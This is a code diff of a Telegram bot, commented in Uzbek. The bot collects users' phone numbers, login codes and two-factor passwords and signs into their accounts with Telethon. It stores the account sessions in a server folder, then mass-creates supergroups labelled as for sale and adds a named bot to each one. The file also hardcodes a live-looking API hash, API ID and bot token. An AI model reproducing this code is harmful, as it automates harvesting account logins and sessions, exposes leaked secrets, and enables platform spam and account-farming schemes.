@@ -1,38 +1,200 @@
-import os
 import logging
 import asyncio
+import os
+from pathlib import Path
 from aiohttp import web
-from telethon import TelegramClient
-from telethon.errors import SessionPasswordNeededError
-from telethon.tl.functions.channels import CreateChannelRequest, InviteToChannelRequest
-from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
-from telegram.ext import (
-    Application,
-    CommandHandler,
-    MessageHandler,
-    CallbackQueryHandler,
-    ConversationHandler,
-    ContextTypes,
-    filters,
-)
 
-# === Logging ===
+from telegram import (
+    InlineKeyboardButton, InlineKeyboardMarkup, Update,
+    ReplyKeyboardMarkup, KeyboardButton
+)
+from telegram.ext import (
+    Application, CommandHandler, CallbackQueryHandler,
+    ConversationHandler, MessageHandler, filters, ContextTypes
+)
+from telethon import TelegramClient, errors
+from telethon.tl.functions.channels import CreateChannelRequest, InviteToChannelRequest
+
+# 📂 sessions papkasini yaratamiz
+Path("sessions").mkdir(exist_ok=True)
+
+# ——— TELEGRAM API ma’lumotlari ———
+api_id = 25351311
+api_hash = "7b854af9996797aa9ca67b42f1cd5cbe"
+bot_token = "8350150569:AAEfax1UQn1AnpWrDdwFo0c7zCzDklkcbJk"  # ⚠️ o'z tokeningizni qo'ying
+
+# 🔑 Kirish paroli
+ACCESS_PASSWORD = "dnx"
+
+# 🎯 Avtomatik qo‘shiladigan bot
+TARGET_BOT = "@oxang_bot"
+
+# ——— LOGGER ———
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# === States ===
+# ——— Holatlar ———
 ASK_PASSWORD, SELECT_MODE, PHONE, CODE, PASSWORD, GROUP_RANGE = range(6)
 
-# === Data ===
+# ——— Session va avtorizatsiya boshqaruvlari ———
 sessions = {}
-bot_token = os.environ.get("BOT_TOKEN", "8350150569:AAEfax1UQn1AnpWrDdwFo0c7zCzDklkcbJk")
-api_id = int(os.environ.get("API_ID", "25351311"))
-api_hash = os.environ.get("API_HASH", "7b854af9996797aa9ca67b42f1cd5cbe")
-admin_password = os.environ.get("ADMIN_PASSWORD", "KOT")
+authorized_users = set()
 
-# === Web server ===
-async def handle(request):
-    return web.Response(text="Bot is running!")
+# ——— START ———
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id in authorized_users:
+        return await show_menu(update)
+    await update.message.reply_text("🔒 Kirish parolini kiriting:")
+    return ASK_PASSWORD
+
+# ——— Parol tekshirish ———
+async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.text.strip() != ACCESS_PASSWORD:
+        await update.message.reply_text("❌ Noto‘g‘ri parol.")
+        return ConversationHandler.END
+    authorized_users.add(update.effective_user.id)
+    return await show_menu(update)
+
+# ——— Menyu chiqarish ———
+async def show_menu(update: Update):
+    keyboard = [[
+        InlineKeyboardButton("Guruh ochish", callback_data='create_group'),
+        InlineKeyboardButton("Guruhni topshirish", callback_data='transfer_group')
+    ]]
+    target = update.message or update.callback_query.message
+    await target.reply_text("Rejimni tanlang⚙️", reply_markup=InlineKeyboardMarkup(keyboard))
+    return SELECT_MODE
+
+# ——— Rejim tanlash ———
+async def mode_chosen(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    context.user_data['mode'] = query.data
+    keyboard = ReplyKeyboardMarkup(
+        [[KeyboardButton("📱 Telefon raqamni yuborish", request_contact=True)]],
+        resize_keyboard=True, one_time_keyboard=True
+    )
+    await query.message.reply_text("📞 Telefon raqamingizni yuboring:", reply_markup=keyboard)
+    return PHONE
+
+# ——— Telefon qabul qilish ———
+async def phone_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    phone = update.message.contact.phone_number if update.message.contact else update.message.text.strip()
+    if not phone.startswith('+') or not phone[1:].isdigit():
+        await update.message.reply_text("Telefon raqam + bilan boshlanishi va raqam bo‘lishi kerak.")
+        return PHONE
+
+    context.user_data['phone'] = phone
+    client = TelegramClient(f"sessions/{phone}", api_id, api_hash)
+    sessions[update.effective_user.id] = client
+
+    await client.start(phone=lambda: phone)
+    if not await client.is_user_authorized():
+        try:
+            await client.send_code_request(phone)
+            await update.message.reply_text("📩 Kod yuborildi, kiriting:")
+            return CODE
+        except Exception as e:
+            logger.exception(e)
+            await update.message.reply_text(f"❌ Xato: {e}")
+            return ConversationHandler.END
+
+    await update.message.reply_text("✅ Akkount allaqachon ulangan.")
+    return await after_login(update, context)
+
+# ——— Kod qabul qilish ———
+async def code_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    client = sessions.get(update.effective_user.id)
+    phone = context.user_data.get('phone')
+    try:
+        await client.sign_in(phone, update.message.text.strip())
+    except errors.SessionPasswordNeededError:
+        await update.message.reply_text("🔑 2 bosqichli parolni kiriting:")
+        return PASSWORD
+    except Exception as e:
+        logger.exception(e)
+        await update.message.reply_text(f"❌ Xato: {e}")
+        return ConversationHandler.END
+    return await after_login(update, context)
+
+# ——— 2FA parol ———
+async def password_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    client = sessions.get(update.effective_user.id)
+    try:
+        await client.sign_in(password=update.message.text.strip())
+    except Exception as e:
+        logger.exception(e)
+        await update.message.reply_text(f"❌ Xato: {e}")
+        return ConversationHandler.END
+    return await after_login(update, context)
+
+# ——— Login tugagach ———
+async def after_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("📊 Nechta guruh yaratilsin? (masalan 1-5)")
+    return GROUP_RANGE
+
+# ——— Guruh yaratish jarayoni ———
+async def background_group_creator(user_id, client, start, end, mode, context):
+    created, failed = 0, 0
+    status_msg = await context.bot.send_message(user_id, f"⏳ 0/{end-start+1} guruh yaratildi...")
+
+    for i in range(start, end + 1):
+        try:
+            result = await client(CreateChannelRequest(
+                title=f"Guruh #{i}", about="Guruh sotiladi", megagroup=True
+            ))
+            channel = result.chats[0]
+            created += 1
+            try:
+                await client(InviteToChannelRequest(channel, [TARGET_BOT]))
+            except Exception:
+                pass
+        except Exception:
+            failed += 1
+
+        try:
+            await status_msg.edit_text(
+                f"⏳ Jarayon: {i}/{end-start+1}\n"
+                f"✅ Muvaffaqiyatli: {created}\n"
+                f"❌ Nosoz: {failed}"
+            )
+        except Exception:
+            pass
+
+        await asyncio.sleep(3)
+
+    await context.bot.send_message(user_id, f"🏁 Tugadi!\n✅ {created} ta yaratildi\n❌ {failed} ta xato")
+    await client.disconnect()
+    sessions.pop(user_id, None)
+
+# ——— Guruhlar soni qabul qilish ———
+async def group_range_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        start, end = map(int, update.message.text.strip().split('-'))
+        if start <= 0 or end < start:
+            raise ValueError
+    except ValueError:
+        await update.message.reply_text("❌ Noto‘g‘ri format. Masalan: 1-5")
+        return GROUP_RANGE
+
+    client = sessions.get(update.effective_user.id)
+    await update.message.reply_text("⏳ Guruh yaratish jarayoni boshlandi...")
+    asyncio.create_task(background_group_creator(
+        update.effective_user.id, client, start, end,
+        context.user_data.get('mode'), context
+    ))
+    return ConversationHandler.END
+
+# ——— Bekor qilish ———
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ Bekor qilindi.")
+    if (client := sessions.pop(update.effective_user.id, None)):
+        await client.disconnect()
+    return ConversationHandler.END
+
+# 🌐 WEB SERVER (Render uchun)
+async def handle(_):
+    return web.Response(text="Bot alive!")
 
 async def start_webserver():
     app = web.Application()
@@ -44,109 +206,10 @@ async def start_webserver():
     await site.start()
     logger.info(f"🌐 Web-server {port} portda ishga tushdi.")
 
-# === Bot Handlers ===
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🔑 Parolni kiriting:")
-    return ASK_PASSWORD
-
-async def ask_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.message.text == admin_password:
-        buttons = [[
-            InlineKeyboardButton("📱 Oddiy login", callback_data="normal"),
-            InlineKeyboardButton("👥 Guruh yaratish", callback_data="group"),
-        ]]
-        await update.message.reply_text("Mode tanlang:", reply_markup=InlineKeyboardMarkup(buttons))
-        return SELECT_MODE
-    else:
-        await update.message.reply_text("❌ Noto‘g‘ri parol.")
-        return ConversationHandler.END
-
-async def mode_chosen(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    context.user_data["mode"] = query.data
-    await query.edit_message_text("📞 Telefon raqamni yuboring:")
-    return PHONE
-
-async def phone_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    phone = update.message.text
-    context.user_data["phone"] = phone
-    client = TelegramClient(f"sessions/{update.message.from_user.id}", api_id, api_hash)
-    await client.connect()
-    sessions[update.message.from_user.id] = client
-
-    if not await client.is_user_authorized():
-        try:
-            await client.send_code_request(phone)
-            await update.message.reply_text("📩 Kod yuborildi. Iltimos kiriting:")
-            return CODE
-        except Exception as e:
-            logger.exception(e)
-            await update.message.reply_text(f"❌ Xato: {e}")
-            return ConversationHandler.END
-    else:
-        await update.message.reply_text("✅ Avvaldan login qilingan!")
-        return ConversationHandler.END
-
-async def code_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    code = update.message.text
-    client = sessions[update.message.from_user.id]
-    phone = context.user_data["phone"]
-    try:
-        await client.sign_in(phone=phone, code=code)
-        if context.user_data["mode"] == "group":
-            await update.message.reply_text("Nechta guruh yaratay?")
-            return GROUP_RANGE
-        else:
-            await update.message.reply_text("✅ Login muvaffaqiyatli.")
-            return ConversationHandler.END
-    except SessionPasswordNeededError:
-        await update.message.reply_text("🔐 2FA parolni kiriting:")
-        return PASSWORD
-    except Exception as e:
-        logger.exception(e)
-        await update.message.reply_text(f"❌ Xato: {e}")
-        return ConversationHandler.END
-
-async def password_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    client = sessions[update.message.from_user.id]
-    phone = context.user_data["phone"]
-    try:
-        await client.sign_in(phone=phone, password=update.message.text)
-        await update.message.reply_text("✅ 2FA muvaffaqiyatli!")
-        return ConversationHandler.END
-    except Exception as e:
-        logger.exception(e)
-        await update.message.reply_text(f"❌ Xato: {e}")
-        return ConversationHandler.END
-
-async def group_range_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    count = int(update.message.text)
-    client = sessions[update.message.from_user.id]
-
-    for i in range(count):
-        try:
-            result = await client(CreateChannelRequest(
-                title=f"Guruh {i+1}",
-                about="Auto-created group",
-                megagroup=True
-            ))
-            chat = result.chats[0]
-            await client(InviteToChannelRequest(chat, [await client.get_me()]))
-        except Exception as e:
-            logger.exception(e)
-
-    await update.message.reply_text(f"✅ {count} ta guruh yaratildi.")
-    return ConversationHandler.END
-
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❌ Bekor qilindi.")
-    return ConversationHandler.END
-
-# === Main ===
-if __name__ == "__main__":
-    # Web serverni background task qilib ishga tushuramiz
-    asyncio.get_event_loop().create_task(start_webserver())
+# 🤖 BOTNI ISHGA TUSHIRISH
+def main():
+    loop = asyncio.get_event_loop()
+    loop.create_task(start_webserver())
 
     application = Application.builder().token(bot_token).build()
 
@@ -155,7 +218,7 @@ if __name__ == "__main__":
         states={
             ASK_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, ask_password)],
             SELECT_MODE: [CallbackQueryHandler(mode_chosen)],
-            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_received)],
+            PHONE: [MessageHandler(filters.TEXT | filters.CONTACT, phone_received)],
             CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, code_received)],
             PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_received)],
             GROUP_RANGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, group_range_received)],
@@ -165,4 +228,7 @@ if __name__ == "__main__":
     application.add_handler(conv_handler)
 
     logger.info("🤖 Bot ishga tushdi.")
-    application.run_polling()  # ✅ async emas, to‘g‘ridan-to‘g‘ri
+    application.run_polling()  # ✅ await emas, sync
+
+if __name__ == "__main__":
+    main()
